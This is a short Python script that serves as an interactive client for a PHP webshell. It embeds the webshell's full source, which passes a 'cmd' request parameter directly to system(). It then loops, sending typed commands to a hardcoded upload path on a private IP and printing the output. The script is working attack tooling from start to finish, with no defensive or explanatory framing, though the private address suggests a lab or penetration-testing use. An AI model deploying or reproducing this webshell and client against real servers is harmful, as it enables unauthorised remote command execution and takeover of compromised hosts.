#!/usr/bin/python3
"""
A very simple webshell client to make use of webshell more confortable.

Provides a convenient prompt with history and completion from history.

Displays the ouput from the system() call if things worked well or the raw HTML
the HTML could not pbe parsed correctly.
"""

import requests

from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory



webshell = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<!-- asdo5426  --><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre><!-- awed0903 -->
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
"""

# URL of the webshell
url = 'http://192.168.85.25/uploaded_files/webshell.php'

#Delimiters for the output from terminal
startSeq = '<!-- asdo5426  --><pre>'
endSeq = '</pre><!-- awed0903 -->'



promptSession = PromptSession(
    history=FileHistory('./webshell_history'))
s = requests.Session()
while True:
    #cmd = input('>')
    cmd = promptSession.prompt('>', auto_suggest=AutoSuggestFromHistory())
    r = s.get( url, params={'cmd':cmd} )
    posStart = r.text.find(startSeq)
    posEnd = r.text.find(endSeq)
    if posEnd == -1:
        posEnd = len(r.text)
    if posStart == -1:
        posStart = 0
    else:
        posStart += len(startSeq)
    print(r.text[posStart:posEnd])

